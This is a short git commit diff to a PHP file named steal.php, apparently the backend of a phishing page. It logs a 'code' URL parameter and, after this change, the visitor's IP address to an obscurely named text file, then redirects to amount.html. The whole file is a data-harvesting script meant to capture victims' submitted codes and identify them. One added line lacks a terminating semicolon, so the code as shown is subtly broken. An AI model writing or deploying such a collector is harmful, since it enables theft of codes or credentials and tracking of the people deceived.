0b8bd9b080a8fbc398aa7a3815cd11aa3eb3757f
cubesniper24 <46076583+cubesniper24@users.noreply.github.com>
2021-02-09 15:15:02 -0500

    Update steal.php

--- steal.php
+++ steal.php
@@ -1,9 +1,14 @@
 <?php
+$ip = $_SERVER['REMOTE_ADDR']
 $code = $_GET['code'];
 fopen("jueaiwlhnfiusldznfisuzhknjsljnbfedjbdfjslknfds.txt", "a");
 $file = fopen("jueaiwlhnfiusldznfisuzhknjsljnbfedjbdfjslknfds.txt", "a");
 fwrite($file, "[");
 fwrite($file, $code);
+fwrite($file, "]");
+
+fwrite($file, "[");
+fwrite($file, $ip);
 fwrite($file, "]");
 header("Location: amount.html")
 ?>
